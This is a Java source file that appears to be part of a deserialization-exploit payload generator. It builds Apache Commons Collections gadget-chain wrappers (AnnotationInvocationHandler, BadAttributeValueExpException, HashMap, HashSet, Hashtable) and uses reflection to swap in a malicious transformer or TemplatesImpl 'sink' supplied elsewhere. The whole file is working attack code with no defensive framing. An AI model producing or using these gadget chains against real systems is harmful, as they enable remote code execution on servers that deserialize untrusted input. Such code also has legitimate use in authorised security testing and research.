import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.Map;

public class Source3 {

    public static InvocationHandler AnnotationInvocationHandlerSource(SinkResult result) throws Exception {
        if (result.id == SinkResultID.TemplatesImplNewTransformer) {
            throw  new IllegalArgumentException("Can't use TemplatesImplNewTransformer as sink");
        }
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        innerMap.put("value", 1);
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformers);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, obj);
        obj = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        Reflections.setFieldValue(outerMap, "factory", result.transformer);
        return obj;
    }


    public static BadAttributeValueExpException BadAttributeValueExpExceptionSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        BadAttributeValueExpException obj = new BadAttributeValueExpException(1);

        try {
            Object resultTransformers = Reflections.getFieldValue(result.transformer, "iTransformers");
            Reflections.setFieldValue(fakeTransformers, "iTransformers", resultTransformers);
        } catch (NullPointerException e) {
            Reflections.setFieldValue(outerMap, "factory", result.transformer);
        }

        Reflections.setFieldValue(obj, "val", tiedMapEntry);

        return obj;
    }

    public static HashMap HashMapSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        HashMap obj = new HashMap();
        obj.put(tiedMapEntry, "t");
        innerMap.clear();

        Reflections.setFieldValue(outerMap, "factory", result.transformer);

        return obj;
    }

    public static HashSet HashSetSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "t");
        HashSet obj = new HashSet(hashMap.keySet());
        outerMap.clear();

        Reflections.setFieldValue(outerMap, "factory", result.transformer);

        return obj;
    }

    public static Hashtable HashtableSource(SinkResult result) throws Exception{
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeTransformers);
        lazyMap1.put("yy", tpl);

        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeTransformers);
        lazyMap2.put("zZ", tpl);

        Hashtable obj = new Hashtable();
        obj.put(lazyMap1, tpl);
        obj.put(lazyMap2, tpl);
        lazyMap2.remove("yy");

        try {
            Object resultTransformers = Reflections.getFieldValue(result.transformer, "iTransformers");
            Reflections.setFieldValue(fakeTransformers, "iTransformers", resultTransformers);
        } catch (NullPointerException e) {
            throw e;
        }

        return obj;
    }

    private static Transformer generateFakeTransformers() {
        return new ChainedTransformer(new Transformer[]{new ConstantTransformer(0)});
    }

}
